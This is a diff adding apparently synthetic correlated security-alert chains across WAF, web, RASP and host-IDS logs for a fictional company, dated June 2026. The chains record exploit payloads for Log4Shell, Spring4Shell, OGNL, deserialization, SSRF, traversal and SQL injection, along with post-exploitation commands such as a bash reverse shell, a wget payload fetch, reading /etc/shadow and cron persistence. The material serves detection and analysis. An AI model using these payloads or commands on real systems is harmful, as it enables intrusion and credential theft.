@@ -1,0 +1,179 @@
+1. `2026-06-21 07:34:46` **[waf]** `WAF0340624`
+    `/api/v2/login username=${jndi:ldap://10.20.7.31:1389/Basic/Command/Base64/dW5hbWUgLWE=} Mozilla/5.0 (Windows N`
+2. `2026-06-21 07:34:47` **[web]** `WEB0342840`
+    `/api/v2/login username=${jndi:ldap://10.20.7.31:1389/Basic/Command/Base64/dW5hbWUgLWE=} Mozilla/5.0 (Windows N`
+3. `2026-06-21 07:34:49` **[rasp]** `RASP0376865`
+    `https://app-java-152.ops-corp.com/api/v2/login {"jndi": "ldap://10.20.7.31:1389"} Mozilla/5.0 (Windows NT 10.0`
+4. `2026-06-21 07:36:46` **[hids]** `HID0369142`
+    `uname -a /usr/bin/uname uname -a <== /bin/sh -c 'uname -a' <== /usr/bin/java -jar /opt/app/auth-service.jar`
+
+1. `2026-06-12 07:55:38` **[waf]** `WAF0278444`
+    `/submit class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i Mozilla/5.0 (Windows N`
+2. `2026-06-12 07:55:40` **[web]** `WEB0280256`
+    `/submit class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{c2}i Mozilla/5.0 (Windows N`
+3. `2026-06-12 07:55:41` **[rasp]** `RASP0308063`
+    `https://app-spring-27.ops-corp.com/submit {"property": "classLoader.first"} Mozilla/5.0 (Windows NT 11.0; Win6`
+4. `2026-06-12 07:56:40` **[hids]** `HID0301755`
+    `whoami /usr/bin/whoami whoami <== /bin/sh -c 'whoami' <== /usr/local/tomcat/bin/catalina.sh`
+
+1. `2026-06-26 10:52:35` **[waf]** `WAF0376175`
+    `/actuator/gateway {"name":"RewritePath","args":{"_genkey_0":"#{T(java.lang.Runtime)}"}} Mozilla/5.0 (X11; Linu`
+2. `2026-06-26 10:52:36` **[web]** `WEB0378622`
+    `/actuator/gateway {"name":"RewritePath","args":{"_genkey_0":"#{T(java.lang.Runtime)}"}} Mozilla/5.0 (X11; Linu`
+3. `2026-06-26 10:52:37` **[rasp]** `RASP0416202`
+    `https://app-spring-95.ops-corp.com/actuator/gateway {"spel": "#{T(java.lang.Runtime)}"} Mozilla/5.0 (X11; Linu`
+4. `2026-06-26 10:54:03` **[hids]** `HID0407665`
+    `ssh -o StrictHostKeyChecking=no -i /tmp/.k root@10.20.4.23 id ssh ssh -o StrictHostKeyChecking=no -i /tmp/.k <`
+
+1. `2026-06-27 16:37:55` **[waf]** `WAF0384754`
+    `/pages/doenterpagevariables.action ?queryString=%24%7B%40java.lang.Runtime%40getRuntime Mozilla/5.0 (Macintosh`
+2. `2026-06-27 16:37:56` **[web]** `WEB0387257`
+    `/pages/doenterpagevariables.action ?queryString=%24%7B%40java.lang.Runtime%40getRuntime Mozilla/5.0 (Macintosh`
+3. `2026-06-27 16:37:58` **[rasp]** `RASP0425695`
+    `https://app-java-88.ops-corp.com/pages/doenterpagevariables.action {"ognl": "exec"} Mozilla/5.0 (Macintosh; In`
+4. `2026-06-27 16:39:53` **[hids]** `HID0416965`
+    `id /usr/bin/id id <== /bin/sh -c 'id' <== /opt/atlassian/confluence/bin/catalina.sh`
+
+1. `2026-06-22 16:00:22` **[waf]** `WAF0349974`
+    `/user/login.action Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)} Mozilla/5.0 (Windows NT 10.0`
+2. `2026-06-22 16:00:24` **[web]** `WEB0352251`
+    `/user/login.action Content-Type: %{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)} Mozilla/5.0 (Windows NT 10.0`
+3. `2026-06-22 16:00:26` **[rasp]** `RASP0387210`
+    `https://app-tomcat-71.ops-corp.com/user/login.action {"ognl": "(#cmd='id')"} Mozilla/5.0 (Windows NT 10.0; Win`
+4. `2026-06-22 16:02:23` **[hids]** `HID0379274`
+    `id;hostname /usr/bin/id id;hostname <== /bin/sh -c 'id;hostname' <== /usr/local/tomcat/bin/catalina.sh`
+
+1. `2026-06-16 16:47:09` **[waf]** `WAF0308678`
+    `/bea_wls_internal/T3 t3 12.2.1 AS:255 HL:19 rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA== Mozilla/5.0 (Linux; Android 1`
+2. `2026-06-16 16:47:10` **[web]** `WEB0310687`
+    `/bea_wls_internal/T3 t3 12.2.1 AS:255 HL:19 rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA== Mozilla/5.0 (Linux; Android 1`
+3. `2026-06-16 16:47:12` **[rasp]** `RASP0341517`
+    `https://app-java-41.ops-corp.com/bea_wls_internal/T3 {"t3": "rO0ABXNyABFqYXZh"} Mozilla/5.0 (Linux; Android 14`
+4. `2026-06-16 16:48:14` **[hids]** `HID0334519`
+    `nohup /tmp/.w -d <== /bin/sh -c 'nohup /tmp/.w -d' <== java -Dweblogic.Name=AdminServer weblogic.Server`
+
+1. `2026-06-16 01:14:43` **[waf]** `WAF0304198`
+    `/api/user/profile {"@type":"com.sun.rowset.JdbcRowSetImpl","url":"ldap://10.20.7.31"} Mozilla/5.0 (iPhone; CPU`
+2. `2026-06-16 01:14:44` **[web]** `WEB0306177`
+    `/api/user/profile {"@type":"com.sun.rowset.JdbcRowSetImpl","url":"ldap://10.20.7.31"} Mozilla/5.0 (iPhone; CPU`
+3. `2026-06-16 01:14:45` **[rasp]** `RASP0336559`
+    `https://app-java-119.ops-corp.com/api/user/profile {"autoType": "JdbcRowSetImpl"} Mozilla/5.0 (iPhone; CPU iPh`
+4. `2026-06-16 01:16:10` **[hids]** `HID0329665`
+    `touch /tmp/.x <== /bin/sh -c 'touch /tmp/.x' <== /usr/bin/java -jar /opt/app/user-api.jar`
+
+1. `2026-06-28 04:34:48` **[waf]** `WAF0388199`
+    `/webtools/control/xmlrpc <value>rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==</value> Mozilla/5.0 (Linux; Android 13; S`
+2. `2026-06-28 04:34:50` **[web]** `WEB0390725`
+    `/webtools/control/xmlrpc <value>rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==</value> Mozilla/5.0 (Linux; Android 13; S`
+3. `2026-06-28 04:34:51` **[rasp]** `RASP0429507`
+    `https://app-java-76.ops-corp.com/webtools/control/xmlrpc {"deserialization": "rO0ABXNy"} Mozilla/5.0 (Linux; A`
+4. `2026-06-28 04:35:51` **[hids]** `HID0420693`
+    `env /usr/bin/env env <== /bin/sh -c 'env' <== /usr/bin/java -jar /opt/app/ofbiz.jar`
+
+1. `2026-06-20 06:52:00` **[waf]** `WAF0333498`
+    `/solr/core1/select wt=velocity&v.template=custom&v.template.custom=#set($c=$cmd) Mozilla/5.0 (Windows NT 10.0;`
+2. `2026-06-20 06:52:01` **[web]** `WEB0335668`
+    `/solr/core1/select wt=velocity&v.template=custom&v.template.custom=#set($c=$cmd) Mozilla/5.0 (Windows NT 10.0;`
+3. `2026-06-20 06:52:03` **[rasp]** `RASP0368981`
+    `https://app-java-63.ops-corp.com/solr/core1/select {"template": "velocity"} Mozilla/5.0 (Windows NT 10.0; Win6`
+4. `2026-06-20 06:53:05` **[hids]** `HID0361416`
+    `sh /tmp/.v <== /bin/sh -c 'sh /tmp/.v' <== /usr/bin/java -jar /opt/solr/server/start.jar`
+
+1. `2026-06-06 23:48:26` **[waf]** `WAF0241503`
+    `/cli command=help&args=@/etc/passwd&remoting=false Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.3`
+2. `2026-06-06 23:48:27` **[web]** `WEB0243075`
+    `/cli command=help&args=@/etc/passwd&remoting=false Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.3`
+3. `2026-06-06 23:48:29` **[rasp]** `RASP0267187`
+    `https://app-java-134.ops-corp.com/cli {"file_read": "@/etc/passwd", "cli": "help"} Mozilla/5.0 (Windows NT 11.`
+4. `2026-06-06 23:50:00` **[hids]** `HID0261725`
+    `cat /var/lib/jenkins/config.xml <== /bin/sh -c 'cat config.xml' <== java -jar /opt/app/jenkins.war`
+
+1. `2026-06-01 02:47:06` **[waf]** `WAF0200842`
+    `/index.php ?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd Mozilla/5.0 (X11; Linux x86_64) A`
+2. `2026-06-01 02:47:08` **[web]** `WEB0202149`
+    `/index.php ?file=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd Mozilla/5.0 (X11; Linux x86_64) A`
+3. `2026-06-01 02:47:09` **[rasp]** `RASP0222195`
+    `https://app-php-44.ops-corp.com/index.php {"path_traversal": "%252e%252e%252f"} Mozilla/5.0 (X11; Linux x86_64`
+4. `2026-06-01 02:48:35` **[hids]** `HID0217661`
+    `cat /etc/shadow /usr/bin/cat cat /etc/shadow <== /bin/sh -c 'cat /etc/shadow' <== php-fpm: pool www`
+
+1. `2026-06-08 13:31:44` **[waf]** `WAF0252379`
+    `/index.php /%0A%0Aallow_url_include%3Don%0A%0Aauto_prepend_file%3Dphp%3A%2F%2Finput Mozilla/5.0 (Macintosh; In`
+2. `2026-06-08 13:31:45` **[web]** `WEB0254022`
+    `/index.php /%0A%0Aallow_url_include%3Don%0A%0Aauto_prepend_file%3Dphp%3A%2F%2Finput Mozilla/5.0 (Macintosh; In`
+3. `2026-06-08 13:31:47` **[rasp]** `RASP0279222`
+    `https://app-php-118.ops-corp.com/index.php {"fpm_newline": "auto_prepend"} Mozilla/5.0 (Macintosh; Intel Mac O`
+4. `2026-06-08 13:33:17` **[hids]** `HID0273512`
+    `wget -qO /tmp/.f 10.20.5.77/f <== /bin/sh -c 'wget -qO /tmp/.f 10.20.5.77/f' <== php-fpm: pool www`
+
+1. `2026-06-22 01:24:01` **[waf]** `WAF0345762`
+    `/_ignition {"solution":"MakeViewVariableOptionalSolution","viewFile":"phar:///tmp"} Mozilla/5.0 (Windows NT 10`
+2. `2026-06-22 01:24:02` **[web]** `WEB0348012`
+    `/_ignition {"solution":"MakeViewVariableOptionalSolution","viewFile":"phar:///tmp"} Mozilla/5.0 (Windows NT 10`
+3. `2026-06-22 01:24:03` **[rasp]** `RASP0382550`
+    `https://app-php-156.ops-corp.com/_ignition {"deserialization": "phar://"} Mozilla/5.0 (Windows NT 10.0; Win64;`
+4. `2026-06-22 01:24:58` **[hids]** `HID0374705`
+    `printf PD9waHAgPz4= > /var/www/html/i.php <== /bin/sh -c 'printf PD9waHAgPz4=' <== php-fpm: pool www`
+
+1. `2026-06-20 11:26:20` **[waf]** `WAF0334817`
+    `/index.php ?lang=zh-cn&s=think\app/invokefunction&function=call_user_func_array Mozilla/5.0 (Linux; Android 14`
+2. `2026-06-20 11:26:22` **[web]** `WEB0336995`
+    `/index.php ?lang=zh-cn&s=think\app/invokefunction&function=call_user_func_array Mozilla/5.0 (Linux; Android 14`
+3. `2026-06-20 11:26:24` **[rasp]** `RASP0370439`
+    `https://app-php-83.ops-corp.com/index.php {"invokefunction": "call_user_func_array"} Mozilla/5.0 (Linux; Andro`
+4. `2026-06-20 11:27:23` **[hids]** `HID0362844`
+    `ls -la /var/www/html <== /bin/sh -c 'ls -la /var/www/html' <== php-fpm: pool www`
+
+1. `2026-06-27 04:49:48` **[waf]** `WAF0381351`
+    `/api/v1/render ?tpl=constructor.constructor('return process')().binding('spawn_sync') Mozilla/5.0 (iPhone; CPU`
+2. `2026-06-27 04:49:49` **[web]** `WEB0383832`
+    `/api/v1/render ?tpl=constructor.constructor('return process')().binding('spawn_sync') Mozilla/5.0 (iPhone; CPU`
+3. `2026-06-27 04:49:51` **[rasp]** `RASP0421930`
+    `https://app-node-62.ops-corp.com/api/v1/render {"binding": "spawn_sync", "escape": "vm"} Mozilla/5.0 (iPhone; `
+4. `2026-06-27 04:50:53` **[hids]** `HID0413272`
+    `bash -i >& /dev/tcp/10.20.7.31/9001 0>&1 <== /bin/sh -c 'bash -i' <== /usr/bin/node /opt/app/render.js`
+
+1. `2026-06-07 07:41:05` **[waf]** `WAF0243774`
+    `/api/avatar url=http://169.254.169.254/latest/meta-data/&x-middleware-subrequest=middleware:middleware:middlew`
+2. `2026-06-07 07:41:06` **[web]** `WEB0245361`
+    `/api/avatar url=http://169.254.169.254/latest/meta-data/&x-middleware-subrequest=middleware:middleware:middlew`
+3. `2026-06-07 07:41:07` **[rasp]** `RASP0269700`
+    `https://app-node-149.ops-corp.com/api/avatar {"ssrf": "169.254.169.254", "bypass": "x-middleware-subrequest"} `
+4. `2026-06-07 07:43:08` **[hids]** `HID0264189`
+    `curl 169.254.169.254/latest <== /bin/sh -c 'curl 169.254.169.254' <== /usr/bin/node /opt/app/server.js`
+
+1. `2026-06-04 16:53:15` **[waf]** `WAF0225668`
+    `/public/plugins/alertlist/ ../../../../../../etc/grafana/grafana.ini Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
+2. `2026-06-04 16:53:17` **[web]** `WEB0227137`
+    `/public/plugins/alertlist/ ../../../../../../etc/grafana/grafana.ini Mozilla/5.0 (Windows NT 10.0; Win64; x64)`
+3. `2026-06-04 16:53:18` **[rasp]** `RASP0249666`
+    `https://app-go-109.ops-corp.com/public/plugins/alertlist/ {"traversal": "etc/grafana.db"} Mozilla/5.0 (Windows`
+4. `2026-06-04 16:55:13` **[hids]** `HID0244567`
+    `cat /etc/grafana/grafana.ini <== /bin/sh -c 'cat /etc/grafana/grafana.ini' <== grafana-server`
+
+1. `2026-06-16 05:42:09` **[waf]** `WAF0305483`
+    `/h2-console/login.do driver=javax.naming.InitialContext&url=ldap://10.20.5.19 Mozilla/5.0 (Windows NT 11.0; Wi`
+2. `2026-06-16 05:42:10` **[web]** `WEB0307470`
+    `/h2-console/login.do driver=javax.naming.InitialContext&url=ldap://10.20.5.19 Mozilla/5.0 (Windows NT 11.0; Wi`
+3. `2026-06-16 05:42:12` **[rasp]** `RASP0337981`
+    `https://app-spring-2.ops-corp.com/h2-console/login.do {"jndi": "ldap://10.20.5.19"} Mozilla/5.0 (Windows NT 11`
+4. `2026-06-16 05:43:07` **[hids]** `HID0331055`
+    `chmod +x /tmp/.h2 <== /bin/sh -c 'chmod +x /tmp/.h2' <== /usr/bin/java -jar /opt/app/admin.jar`
+
+1. `2026-06-03 21:23:12` **[waf]** `WAF0220045`
+    `/report/export ?year=2026 AND 1=CAST((SELECT version()) AS int) Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/53`
+2. `2026-06-03 21:23:14` **[web]** `WEB0221477`
+    `/report/export ?year=2026 AND 1=CAST((SELECT version()) AS int) Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/53`
+3. `2026-06-03 21:23:15` **[rasp]** `RASP0243444`
+    `https://app-django-187.ops-corp.com/report/export {"sqli": "cast_error", "engine": "postgres"} Mozilla/5.0 (X1`
+4. `2026-06-03 21:25:14` **[hids]** `HID0238475`
+    `cat /opt/app/settings.py <== /bin/sh -c 'cat /opt/app/settings.py' <== /usr/bin/python3 /opt/app/manage.py`
+
+1. `2026-06-30 09:33:08` **[waf]** `WAF0403473`
+    `/api/v3/session authenticity_token=BAhvOhhBY3RpdmVTdXBwb3J0OjpUaW1lV2l0aFpvbmU Mozilla/5.0 (Macintosh; Intel M`
+2. `2026-06-30 09:33:09` **[web]** `WEB0406098`
+    `/api/v3/session authenticity_token=BAhvOhhBY3RpdmVTdXBwb3J0OjpUaW1lV2l0aFpvbmU Mozilla/5.0 (Macintosh; Intel M`
+3. `2026-06-30 09:33:11` **[rasp]** `RASP0446407`
+    `https://app-rails-55.ops-corp.com/api/v3/session {"deserialization": "Marshal"} Mozilla/5.0 (Macintosh; Intel `
+4. `2026-06-30 09:34:41` **[hids]** `HID0437247`
+    `echo @reboot /tmp/.r>>/var/spool/cron/root <== /bin/sh -c 'echo @reboot /tmp/.r' <== ruby /opt/app/bin/rails`
